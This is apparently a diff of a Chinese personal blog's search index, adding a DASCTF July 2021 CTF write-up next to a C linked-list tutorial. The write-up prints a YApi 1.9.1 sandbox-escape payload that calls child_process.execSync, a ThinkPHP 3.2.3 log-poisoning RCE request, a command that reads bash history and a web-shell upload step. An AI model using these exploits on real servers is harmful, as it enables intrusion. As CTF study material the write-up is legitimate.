@@ -79,6 +79,29 @@
       </tags>
   </entry>
   <entry>
+    <title>链表-c语言</title>
+    <url>/2020/09/16/2020.9.16%E9%93%BE%E8%A1%A8/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://shmily-ing.github.io/">Shmily-ing’blog</a>! </p>
+<p>下面主要是运用C去实现链表的头插法，尾插法实现有序插入，以及中间插入一个数。</p>
+<span id="more"></span>
+
+<h2 id="头插法"><a href="#头插法" class="headerlink" title="头插法"></a>头插法</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span><span class="comment">// 头插法</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* run this program using the console pauser or add your own getch, system(&quot;pause&quot;) or input loop */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> data ;</span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">	</span><br><span class="line">&#125;<span class="built_in">list</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span> *head,*s;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">list</span> *p;</span><br><span class="line">	head=<span class="literal">NULL</span>;</span><br><span class="line">	</span><br><span class="line">	input();</span><br><span class="line">	<span class="keyword">for</span>(p=head;p!=<span class="literal">NULL</span>;p=p-&gt;next)&#123; <span class="comment">//输出头插法链表数据</span></span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot; %d &quot;</span>,p-&gt;data);</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	</span><br><span class="line">	head = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line">	<span class="keyword">while</span>(i!=<span class="number">100</span>)&#123;</span><br><span class="line">		</span><br><span class="line">		s=(<span class="built_in">list</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="built_in">list</span>));</span><br><span class="line">		s-&gt;data=i;</span><br><span class="line">		s-&gt;next = head;  <span class="comment">//第一个数据地址为空，下一个指向前一个s；</span></span><br><span class="line">		head = s;          <span class="comment">//作为新头部；</span></span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="尾插法的有序插入"><a href="#尾插法的有序插入" class="headerlink" title="尾插法的有序插入"></a>尾插法的有序插入</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">         <span class="keyword">char</span> data;</span><br><span class="line">          <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;linklist;</span><br><span class="line">  linklist *head,*tail;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">   linklist *p;</span><br><span class="line">   head=tail=<span class="literal">NULL</span>;</span><br><span class="line">   input();</span><br><span class="line">   <span class="keyword">for</span>(p=head;p!=<span class="literal">NULL</span>;p=p-&gt;next)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c\n&quot;</span>,p-&gt;data);</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">char</span> ch;</span><br><span class="line">   linklist *t;</span><br><span class="line">   ch=getchar();</span><br><span class="line">   <span class="keyword">while</span>(ch!=&amp;apos;@&amp;apos;)&#123;</span><br><span class="line">       t=(linklist *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linklist));</span><br><span class="line">       t-&gt;data=ch;</span><br><span class="line">       <span class="keyword">if</span>(head==<span class="literal">NULL</span>)&#123;</span><br><span class="line">       head=t;</span><br><span class="line">       t-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">       tail-&gt;next=t;</span><br><span class="line">&#125;</span><br><span class="line">   tail=t;</span><br><span class="line">   tail-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">   t=(linklist *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linklist));</span><br><span class="line">   ch=getchar();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="插入有序链表一个数"><a href="#插入有序链表一个数" class="headerlink" title="插入有序链表一个数"></a>插入有序链表一个数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span>     <span class="comment">//实现简单的有序链表插入 </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* run this program using the console pauser or add your own getch, system(&quot;pause&quot;) or input loop */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> data ;</span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">	</span><br><span class="line">&#125;<span class="built_in">list</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span> *head,*tail;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input_inset</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">list</span> *p; </span><br><span class="line">	head=tail=<span class="literal">NULL</span>;</span><br><span class="line">	input_inset();</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">for</span>(p=head;p!=<span class="literal">NULL</span>;p=p-&gt;next)&#123;     </span><br><span class="line">	</span><br><span class="line">	          <span class="built_in">printf</span>(<span class="string">&quot; %d &quot;</span>,p-&gt;data);         </span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input_inset</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,num;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">list</span> *t,*T,*pp;</span><br><span class="line">	t = (<span class="built_in">list</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="built_in">list</span>));</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line">	<span class="keyword">while</span>(i!=<span class="number">100</span>)&#123;</span><br><span class="line">		</span><br><span class="line">		t-&gt;data = i;</span><br><span class="line">		<span class="keyword">if</span>(head==<span class="literal">NULL</span>)&#123;  </span><br><span class="line">	</span><br><span class="line">		    head = t;     </span><br><span class="line">		    t-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> tail-&gt;next=t;</span><br><span class="line">	</span><br><span class="line">	tail = t;   </span><br><span class="line">	</span><br><span class="line">	tail-&gt;next=<span class="literal">NULL</span>;  </span><br><span class="line">	</span><br><span class="line">	t = (<span class="built_in">list</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="built_in">list</span>));</span><br><span class="line">	</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//插入操作 </span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入插入点的前一个数字:\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span>(pp=head;pp!=<span class="literal">NULL</span>;pp= pp-&gt;next)&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(pp-&gt;data==num)&#123;</span><br><span class="line">			</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;请输入要插入的数字:\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">			T = (<span class="built_in">list</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="built_in">list</span>));</span><br><span class="line">	</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;T-&gt;data);</span><br><span class="line">			</span><br><span class="line">			</span><br><span class="line">			T-&gt;next=pp-&gt;next;</span><br><span class="line">			</span><br><span class="line">			pp-&gt;next = T;</span><br><span class="line">		</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;输出插入后的链表\n&quot;</span>);	</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>多谢刘**的指导（内心抗拒）</p>
+<p>可能写的不是很完美，感谢大佬的访问~~ORZ</p>
+]]></content>
+      <categories>
+        <category>C语言</category>
+      </categories>
+      <tags>
+        <tag>算法与数据结构</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>BUU- [GWCTF 2019]</title>
     <url>/2020/09/27/2020-9-27buuctf/</url>
     <content><![CDATA[<p>Welcome to <a href="https://shmily-ing.github.io/">Shmily-ing’blog</a>! </p>
@@ -152,26 +175,61 @@
       </tags>
   </entry>
   <entry>
-    <title>链表-c语言</title>
-    <url>/2020/09/16/2020.9.16%E9%93%BE%E8%A1%A8/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://shmily-ing.github.io/">Shmily-ing’blog</a>! </p>
-<p>下面主要是运用C去实现链表的头插法，尾插法实现有序插入，以及中间插入一个数。</p>
+    <title>21DASCTFJuly</title>
+    <url>/2021/08/01/21DASCTFJuly/</url>
+    <content><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>您的排名：148      慢慢复现有时间</p>
+<p><img src="/2021/08/01/21DASCTFJuly/image-20210801183537143.png" alt="image-20210801183537143"></p>
 <span id="more"></span>
 
-<h2 id="头插法"><a href="#头插法" class="headerlink" title="头插法"></a>头插法</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span><span class="comment">// 头插法</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* run this program using the console pauser or add your own getch, system(&quot;pause&quot;) or input loop */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> data ;</span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">	</span><br><span class="line">&#125;<span class="built_in">list</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span> *head,*s;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">list</span> *p;</span><br><span class="line">	head=<span class="literal">NULL</span>;</span><br><span class="line">	</span><br><span class="line">	input();</span><br><span class="line">	<span class="keyword">for</span>(p=head;p!=<span class="literal">NULL</span>;p=p-&gt;next)&#123; <span class="comment">//输出头插法链表数据</span></span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot; %d &quot;</span>,p-&gt;data);</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	</span><br><span class="line">	head = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line">	<span class="keyword">while</span>(i!=<span class="number">100</span>)&#123;</span><br><span class="line">		</span><br><span class="line">		s=(<span class="built_in">list</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="built_in">list</span>));</span><br><span class="line">		s-&gt;data=i;</span><br><span class="line">		s-&gt;next = head;  <span class="comment">//第一个数据地址为空，下一个指向前一个s；</span></span><br><span class="line">		head = s;          <span class="comment">//作为新头部；</span></span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat flag"></a>cat flag</h4><p><img src="/2021/08/01/21DASCTFJuly/image-20210801180135739.png" alt="image-20210801180135739"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;  </span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];  </span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/flag/i&#x27;</span>,<span class="variable">$cmd</span>))  &#123;    </span><br><span class="line">    <span class="variable">$cmd</span> = escapeshellarg(<span class="variable">$cmd</span>);    </span><br><span class="line">    system(<span class="string">&#x27;cat &#x27;</span> . <span class="variable">$cmd</span>);  &#125;&#125; </span><br><span class="line"><span class="keyword">else</span> &#123;  highlight_file(<span class="keyword">__FILE__</span>);&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<h2 id="尾插法的有序插入"><a href="#尾插法的有序插入" class="headerlink" title="尾插法的有序插入"></a>尾插法的有序插入</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">         <span class="keyword">char</span> data;</span><br><span class="line">          <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;linklist;</span><br><span class="line">  linklist *head,*tail;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">   linklist *p;</span><br><span class="line">   head=tail=<span class="literal">NULL</span>;</span><br><span class="line">   input();</span><br><span class="line">   <span class="keyword">for</span>(p=head;p!=<span class="literal">NULL</span>;p=p-&gt;next)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c\n&quot;</span>,p-&gt;data);</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">char</span> ch;</span><br><span class="line">   linklist *t;</span><br><span class="line">   ch=getchar();</span><br><span class="line">   <span class="keyword">while</span>(ch!=&amp;apos;@&amp;apos;)&#123;</span><br><span class="line">       t=(linklist *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linklist));</span><br><span class="line">       t-&gt;data=ch;</span><br><span class="line">       <span class="keyword">if</span>(head==<span class="literal">NULL</span>)&#123;</span><br><span class="line">       head=t;</span><br><span class="line">       t-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">       tail-&gt;next=t;</span><br><span class="line">&#125;</span><br><span class="line">   tail=t;</span><br><span class="line">   tail-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">   t=(linklist *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linklist));</span><br><span class="line">   ch=getchar();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<hr>
-<h3 id="插入有序链表一个数"><a href="#插入有序链表一个数" class="headerlink" title="插入有序链表一个数"></a>插入有序链表一个数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span>     <span class="comment">//实现简单的有序链表插入 </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* run this program using the console pauser or add your own getch, system(&quot;pause&quot;) or input loop */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> data ;</span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">	</span><br><span class="line">&#125;<span class="built_in">list</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span> *head,*tail;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input_inset</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">list</span> *p; </span><br><span class="line">	head=tail=<span class="literal">NULL</span>;</span><br><span class="line">	input_inset();</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">for</span>(p=head;p!=<span class="literal">NULL</span>;p=p-&gt;next)&#123;     </span><br><span class="line">	</span><br><span class="line">	          <span class="built_in">printf</span>(<span class="string">&quot; %d &quot;</span>,p-&gt;data);         </span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input_inset</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,num;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">list</span> *t,*T,*pp;</span><br><span class="line">	t = (<span class="built_in">list</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="built_in">list</span>));</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line">	<span class="keyword">while</span>(i!=<span class="number">100</span>)&#123;</span><br><span class="line">		</span><br><span class="line">		t-&gt;data = i;</span><br><span class="line">		<span class="keyword">if</span>(head==<span class="literal">NULL</span>)&#123;  </span><br><span class="line">	</span><br><span class="line">		    head = t;     </span><br><span class="line">		    t-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> tail-&gt;next=t;</span><br><span class="line">	</span><br><span class="line">	tail = t;   </span><br><span class="line">	</span><br><span class="line">	tail-&gt;next=<span class="literal">NULL</span>;  </span><br><span class="line">	</span><br><span class="line">	t = (<span class="built_in">list</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="built_in">list</span>));</span><br><span class="line">	</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//插入操作 </span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入插入点的前一个数字:\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span>(pp=head;pp!=<span class="literal">NULL</span>;pp= pp-&gt;next)&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(pp-&gt;data==num)&#123;</span><br><span class="line">			</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;请输入要插入的数字:\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">			T = (<span class="built_in">list</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="built_in">list</span>));</span><br><span class="line">	</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;T-&gt;data);</span><br><span class="line">			</span><br><span class="line">			</span><br><span class="line">			T-&gt;next=pp-&gt;next;</span><br><span class="line">			</span><br><span class="line">			pp-&gt;next = T;</span><br><span class="line">		</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;输出插入后的链表\n&quot;</span>);	</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="/2021/08/01/21DASCTFJuly/image-20210801180247394.png" alt="image-20210801180247394"></p>
+<p>猜测命令执行查看历史命令文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat ~&#x2F;.bash_history</span><br></pre></td></tr></table></figure>
 
-<p>多谢刘**的指导（内心抗拒）</p>
-<p>可能写的不是很完美，感谢大佬的访问~~ORZ</p>
+<p>但是<code>escapeshellarg()</code>函数不会绕过。。。</p>
+<p><a href="http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/">记录</a></p>
+<h4 id="YApi"><a href="#YApi" class="headerlink" title="YApi"></a>YApi</h4><p>版本1.9.1   刚爆出个漏洞。</p>
+<p>注册，创建项目</p>
+<p><img src="/2021/08/01/21DASCTFJuly/image-20210801180737592.png" alt="image-20210801180737592"></p>
+<p>这里可以命令执行</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> sandbox = <span class="built_in">this</span></span><br><span class="line"><span class="keyword">const</span> ObjectConstructor = <span class="built_in">this</span>.constructor</span><br><span class="line"><span class="keyword">const</span> FunctionConstructor = ObjectConstructor.constructor</span><br><span class="line"><span class="keyword">const</span> myfun = FunctionConstructor(<span class="string">&#x27;return process&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> process = myfun()</span><br><span class="line">mockJson = process.mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;command&quot;</span>).toString()</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2021/08/01/21DASCTFJuly/image-20210801180857819.png" alt="image-20210801180857819"></p>
+<p>保存后，添加接口</p>
+<p><img src="/2021/08/01/21DASCTFJuly/image-20210801180938961.png" alt="image-20210801180938961"></p>
+<p>访问接口</p>
+<p><img src="/2021/08/01/21DASCTFJuly/image-20210801181000869.png" alt="image-20210801181000869"></p>
+<p>即可看到命令执行结果，直接命令执行得flag</p>
+<p><img src="/2021/08/01/21DASCTFJuly/image-20210801181010300.png" alt="image-20210801181010300"></p>
+<p><a href="https://www.pwnwiki.org/index.php?title=Yapi_%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C">参考：</a></p>
+<h4 id="Thinkphp"><a href="#Thinkphp" class="headerlink" title="Thinkphp"></a>Thinkphp</h4><p>v3.2.3直接网上找rce</p>
+<p><img src="/2021/08/01/21DASCTFJuly/image-20210801181452123.png" alt="image-20210801181452123"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?m&#x3D;--&gt;&lt;?&#x3D;phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>要burp中 执行，url中执行不行</p>
+<p><img src="/2021/08/01/21DASCTFJuly/image-20210801182210100.png" alt="image-20210801182210100"></p>
+<p>查看对应日志文件，注意日志时间</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php&#x2F;?m&#x3D;Home&amp;c&#x3D;Index&amp;a&#x3D;index&amp;value[_filename]&#x3D;.&#x2F;Application&#x2F;Runtime&#x2F;Logs&#x2F;Common&#x2F;21_08_01.log</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/08/01/21DASCTFJuly/image-20210801182233463.png" alt="image-20210801182233463"></p>
+<p>命令执行成功，</p>
+<p>上马</p>
+<p><img src="/2021/08/01/21DASCTFJuly/image-20210801182553174.png" alt="image-20210801182553174"></p>
+<p>蚁剑连接好像不太行，奇怪有时候可以</p>
+<p><img src="/2021/08/01/21DASCTFJuly/image-20210801182808593.png" alt="image-20210801182808593"></p>
+<p>找到flag</p>
+<p><img src="/2021/08/01/21DASCTFJuly/image-20210801183006727.png" alt="image-20210801183006727"></p>
+<p><a href="https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ">参考</a></p>
 ]]></content>
       <categories>
-        <category>C语言</category>
+        <category>CTF</category>
       </categories>
       <tags>
-        <tag>算法与数据结构</tag>
+        <tag>DASCTF July X CBCTF 4th</tag>
       </tags>
   </entry>
   <entry>
@@ -205,6 +263,17 @@
       </categories>
       <tags>
         <tag>Access注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Oracle注入</title>
+    <url>/2021/01/10/Oracle%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>常见数据库注入</category>
+      </categories>
+      <tags>
+        <tag>Oracel注入</tag>
       </tags>
   </entry>
   <entry>
@@ -266,17 +335,6 @@
       </categories>
       <tags>
         <tag>MARDASCTF2021</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Oracle注入</title>
-    <url>/2021/01/10/Oracle%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[]]></content>
-      <categories>
-        <category>常见数据库注入</category>
-      </categories>
-      <tags>
-        <tag>Oracel注入</tag>
       </tags>
   </entry>
   <entry>
@@ -387,6 +445,42 @@
       </tags>
   </entry>
   <entry>
+    <title>file_put_content利用(php://filter协议)</title>
+    <url>/2020/10/25/file-put-contents%E5%88%A9%E7%94%A8-php-filter%E5%8D%8F%E8%AE%AE/</url>
+    <content><![CDATA[<hr>
+<h3 id="0×01"><a href="#0×01" class="headerlink" title="0×01"></a>0×01</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(_FILE_);</span><br><span class="line">chdir(<span class="string">&quot;sandbox&quot;</span>);</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$data</span>  = <span class="string">&#x27;&lt;?php exit(); ?&#x27;</span>. <span class="variable">$filename</span>;</span><br><span class="line">file_put_content(<span class="variable">$filename</span>,<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>exit</code>加在filename前面，会导致写入的内容不能执行。（利用php base64_decode函数特性去除“死亡exit”）</p>
